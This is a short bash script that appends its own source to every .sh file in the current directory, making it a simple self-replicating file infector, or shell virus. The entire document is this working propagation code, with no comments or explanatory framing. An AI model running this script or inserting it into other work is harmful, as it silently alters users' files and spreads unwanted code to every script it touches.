#!/bin/bash

files=`ls *.sh`

files=($(echo $files | tr " " "\n"))

for file in "${files[@]}"; do
    echo -e "\n" >> "$file"
    cat $0 >> "$file"
done

exit 0

